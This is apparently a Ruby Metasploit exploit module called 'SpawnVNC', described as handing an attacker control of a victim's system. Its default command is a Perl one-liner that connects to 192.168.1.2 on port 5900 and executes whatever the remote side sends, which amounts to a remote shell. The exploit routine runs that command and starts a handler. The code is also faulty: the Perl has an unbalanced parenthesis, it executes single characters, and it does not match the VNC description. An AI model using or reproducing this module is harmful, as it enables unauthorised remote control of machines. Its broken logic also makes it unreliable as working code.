require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
    Rank = NormalRanking

    include Msf::Exploit::Remote::Tcp

    def initialize(info = {})
        super(update_info(info,
            'Name'           => 'SpawnVNC',
            'Description'    => 'invokes a VNC on the victim and gives control to the attacker through the browser',
            'Author'         => 'Jeanpseven',
            'License'        => MSF_LICENSE,
            'Platform'       => 'unix',
            'Arch'           => ARCH_CMD,
            'Privileged'     => true,
            'Payload'        =>
                {
                    'DisableNops' => true,
                    'BadChars'    => "\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c",
                    'Compat'      =>
                        {
                            'PayloadType' => 'cmd',
                            'RequiredCmd' => 'generic perl python telnet',
                        }
                },
            'Targets'        =>
                [
                    ['Automatic', {}],
                ],
            'DefaultTarget' => 0,
            'DisclosureDate' => 'Jun 27 2017'))

        register_options(
            [
                OptString.new('CMD', [ true, 'The command to execute', 'perl -e \'use IO::Socket::INET;$s=IO::Socket::INET->new(PeerAddr => "192.168.1.2",PeerPort => 5900));exit if not defined $s;while (my $c = $s->getc()) {system($c);}' ])
            ], self.class)
    end

    def exploit
        connect
        print_status("Executing command '#{datastore['CMD']}'")
        cmd_exec(datastore['CMD'])
        handler
        disconnect
    end
end
